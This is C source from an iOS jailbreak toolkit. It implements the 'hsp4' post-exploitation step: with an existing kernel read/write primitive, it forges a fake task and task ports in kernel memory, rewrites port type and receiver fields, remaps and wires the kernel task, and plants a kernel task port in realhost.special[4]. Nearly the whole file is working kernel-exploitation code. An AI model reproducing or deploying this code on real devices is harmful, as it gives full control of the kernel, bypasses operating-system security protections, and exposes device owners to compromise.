//not elec tho

#include "remap_tfp_set_hsp.h"
#include "KernelUtils.h"
#include "kernel_slide.h"
#include "PFOffs.h"
#include <stdlib.h>
#include <dlfcn.h>
#include <mach-o/loader.h>
#include <mach/host_priv.h>
#include <mach/mach_error.h>
#include <mach/mach_host.h>
#include <mach/mach_port.h>
#include <mach/mach_time.h>
#include <mach/task.h>
#include <mach/thread_act.h>
#include <pthread/pthread.h>
#include "OffsetHolder.h"
#include <sched.h>
#include <sys/mman.h>
#include "shenanigans.h"
#include <unistd.h>

#include "ImportantHolders.h"

uint64_t ipc_space_kernel()
{
    return ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

bool iterate_proc_list(void (^handler)(kptr_t, pid_t, bool *)) {
    bool ret = false;
    bool iterate = true;
    kptr_t proc = get_kernel_proc_struct_addr();
    while (KERN_POINTER_VALID(proc) && iterate) {
        pid_t const pid = ReadKernel32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
        handler(proc, pid, &iterate);
        if (!iterate) break;
        proc = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_P_LIST) + sizeof(kptr_t));
    }
    ret = true;
out:;
    return ret;
}

kptr_t get_proc_struct_for_pid_ff(pid_t pid)
{
    __block kptr_t proc = KPTR_NULL;
    void (^const handler)(kptr_t, pid_t, bool *) = ^(kptr_t found_proc, pid_t found_pid, bool *iterate) {
        if (found_pid == pid) {
            proc = found_proc;
            *iterate = false;
        }
    };
    iterate_proc_list(handler);
out:;
    return proc;
}

uint64_t get_proc_struct_for_pid(pid_t pid)
{
    if (get_selfproc() != 0 && pid == getpid())
    {
        return get_selfproc();
    } else {
        return get_proc_struct_for_pid_ff(pid);
    }
    return 0;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;



uint64_t get_address_of_port(pid_t pid, mach_port_t port)
{
    uint64_t proc_struct_addr = get_proc_struct_for_pid(pid);
    uint64_t task_addr = ReadKernel64(proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_TASK));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}



void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = get_address_of_port(getpid(), port);
    
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info_addr) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_addr to: " ADDR, all_image_info_addr);
    if (dyld_info.all_image_info_addr != all_image_info_addr) {
        LOG("Setting all_image_info_addr...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), all_image_info_addr);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_addr == all_image_info_addr, message, true);
    } else {
        LOG("All_image_info_addr already set.");
    }
}

void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_size to: " ADDR, all_image_info_size);
    if (dyld_info.all_image_info_size != all_image_info_size) {
        LOG("Setting all_image_info_size...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
    } else {
        LOG("All_image_info_size already set.");
    }
}


void PatchHostPriv(mach_port_t host) {
    
#define IO_ACTIVE 0x80000000
#define IKOT_HOST_PRIV 4
    
    // locate port in kernel
    uint64_t host_kaddr = get_address_of_port(getpid(), host);
    
    // change port host type
    uint32_t old = ReadKernel32(host_kaddr + 0x0);
    printf("[-] Old host type: 0x%x\n", old);
    
    WriteKernel64(host_kaddr + 0x0, IO_ACTIVE | IKOT_HOST_PRIV);
    
    uint32_t new = ReadKernel32(host_kaddr);
    printf("[-] New host type: 0x%x\n", new);
}





mach_port_t FakeHostPriv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t FakeHostPriv() {
    if (FakeHostPriv_port != MACH_PORT_NULL) {
        return FakeHostPriv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
    uint64_t realhost = ReadKernel64(hostport_addr + koffset(KSTRUCT_OFFSET_PROC_TASK));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return MACH_PORT_NULL;
    }
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // make sure port type has IKOT_HOST_PRIV
    PatchHostPriv(port);
    
    // locate the port
    uint64_t port_addr = get_address_of_port(getpid(), port);
    
    // change the space of the port
    WriteKernel64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
    
    // set the kobject
    WriteKernel64(port_addr +koffset(KSTRUCT_OFFSET_PROC_TASK), realhost);
    
    FakeHostPriv_port = port;
    
    return port;
}


kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
int setHSP4() {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    // we can use mach_host_self() if we're root
    
    mach_port_t mapped_tfp0 = MACH_PORT_NULL;
    mach_port_t *port = &mapped_tfp0;
    mach_port_t host_priv = mach_host_self();
    
    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    uint64_t kernel_task_kaddr = 0;
    if (our_kernel_taskStruct_exportAstylez != 0) {
         kernel_task_kaddr = our_kernel_taskStruct_exportAstylez;//

    } else {
         kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));//our_kernel_taskStruct_exportAstylez;//
    }
    
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    kr = kr || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    if (kr == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, message, true);
    }
    
    
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = GETOFFSET(zone_map_ref);
    uint64_t zone_map = ReadKernel64(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    
    km_fake_task_port = zm_fake_task_port;
    
    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);
    
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    if (kernel_task_kaddr == remapped_task_addr) {
        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }
    
    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
    
    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    uint64_t port_kaddr = get_address_of_port(getpid(), *port);
    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
    
    make_port_fake_task_port(*port, remapped_task_addr);
    
    if (ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }
    
    // lck_mtx -- arm: 8  arm64: 16
    const int off_host_special = 0x10;
    uint64_t host_priv_kaddr = get_address_of_port(getpid(), mach_host_self());
    uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    WriteKernel64(realhost_kaddr + off_host_special + 4 * sizeof(void*), port_kaddr);
    
    return 0;
}
